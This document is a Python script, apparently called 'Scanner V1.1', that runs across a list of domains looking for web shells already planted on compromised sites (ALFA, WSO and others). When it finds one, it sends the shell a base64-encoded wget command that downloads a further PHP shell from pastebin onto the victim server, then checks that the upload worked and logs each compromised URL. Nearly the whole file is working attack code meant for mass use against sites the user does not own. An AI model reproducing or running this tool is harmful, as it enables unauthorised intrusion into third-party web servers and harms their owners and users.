import base64
import os 
import platform
import string
import random
import time

os.system("title " + "Scanner V1.1 - KiKo ")

try:
    print('Checking Requirements.....')
    time.sleep(0.5)
    import requests #callmodule
    import colorama #callmodule
    print('All Available, Go Main Tools.....')
    time.sleep(0.5)
except:
    os.system('pip install requests') #installmodule
    os.system('pip install colorama') #installmodule
    print('All Available, Go Main Tools.....')
    time.sleep(0.5)

import requests
from colorama import init, Fore, Style
from concurrent.futures import ThreadPoolExecutor

try:
	os.mkdir('Result') #createfolder
except:
    pass

s = requests.Session()

uagent = {'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36'} #useragent

os.system('cls' if os.name == 'nt' else 'clear') #clearterminal

init()
merah = Fore.RED #color
hijau = Fore.GREEN #color
cyan = Fore.CYAN #color
kuning = Fore.YELLOW #color
reset = Fore.RESET #color
sysinfo = platform.system() + platform.release() + ' - ' + platform.platform() #deviceinfo

list = ["ALFA_DATA/alfacgiapi/perl.alfa","wp-admin/alfacgiapi/perl.alfa","wp-content/alfacgiapi/perl.alfa","wp-includes/alfacgiapi/perl.alfa","alfacgiapi/perl.alfa","css/ALFA_DATA/alfacgiapi/perl.alfa","files/ALFA_DATA/alfacgiapi/perl.alfa","images/ALFA_DATA/alfacgiapi/perl.alfa","ALFA_DATA/alfacgiapi/perl.alfa","wp-admin/ALFA_DATA/alfacgiapi/perl.alfa","wp-content/ALFA_DATA/alfacgiapi/perl.alfa","wp-includes/ALFA_DATA/alfacgiapi/perl.alfa","fw.php", "shell.php", "date.php", "about.php", "alfa.php", "alfaindex.php", ".alf.php", "wso.php", "wp-content/plugins/cekidot/alf.php", "wp-content/fw.php", "wp-content/alfa.php", "snd.php", "wp-class.php", "xleet.php", "1.php", "2.php", "1337.php", "www.php", "small.php"] #pathlist

def alfa(domain):
    status = 0
    try:
        for i in list:
            if domain.startswith("http://"):
                domain = domain.replace("http://", "")
            elif domain.startswith("https://"):
                domain = domain.replace("https://", "")
            rq = s.get('http://' + domain + '/' +i, headers=uagent)
            if rq.status_code == 200:
                waf = (''.join(random.choices(string.ascii_letters, k=5)))
                data = {'cmd':base64.b64encode(f'echo "success upload shell" && wget https://pastebin.com/raw/edzGRsi8 -O {waf}.php'.encode())}
                ww = s.post('http://' + domain + '/' +i, headers=uagent, data=data).text
                if 'Owner/Group' in rq.text:
                    print(f'[{cyan}+{reset}] http:// ' + domain + '/' + i + f' [ {hijau}FOUND SHELL{reset} ]')
                    with open('Shell-Finder.txt', 'a+') as f:
                        f.write('http://' + domain+'/' + i + "\n")
                if "success upload shell" in ww:
                    with open('PerlRCE.txt', 'a+') as f:
                        f.write('http://' + domain + '/' + i +  "\n")
                    tes = i.split('/')
                    tes[-1] = waf+'.php'
                    testes = s.get('http://' + domain + '/' + '/'.join(tes), headers=uagent).text
                    upshell = 0
                    if 'Owner/Group' in testes:
                        upshell = 1
                        shellpath = 'http://' + domain + '/' + '/'.join(tes)
                        with open('Result/Shells-PerlRCE.txt', 'a+') as f:
                            f.write('http://' + domain + '/' + '/'.join(tes) + "\n")
                    status = 1
                    break

        if status == 0:
            print(f'[{cyan}+{reset}] http://' + domain + f' [ {merah}Not Found{reset} ]')
        else:
            print(f'[{cyan}+{reset}] http://' + domain + f' [ {hijau}Found Perl ALFA{reset} ]')
            if upshell == 1:
                print(f'[{cyan}+{reset}] ' + shellpath + f' [ {hijau}Upload Success{reset} ]')

    except:
        print(f'[{cyan}+{reset}] http://' + domain + f' [ {merah}Unknown Host{reset} ]')       

banner = f"""
{reset} Device : {sysinfo}
{hijau}   _   _   _   _   _   _   _   _   _   _   
{hijau}  / \ / \ / \ / \ / \ / \ / \ / \ / \ / \  {reset}Author  : Jok3r
{hijau} ( R | A | D | I | C | A | L | I | V | 1 ) {reset}Auto Upload Shell
{hijau}  \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/  {reset}
"""
if __name__ == '__main__':
    try:
        print(banner)
        site = input('[?] Domain List > ') #domainlist
        thrd = input('[?] Thread > ') #thread
        perline = open(site,'r').read().splitlines()
        print('')
        with ThreadPoolExecutor(max_workers=int(thrd)) as e:
            [e.submit(alfa, i) for i in perline]
    except KeyboardInterrupt:
        print(f'\n\n{merah}[!] {reset}CTRL + C DETECT {merah}[!]') #forkeyboardinterrupt
    except:
        print(f'{merah}[!] {reset}INCORRECT {merah}[!]')
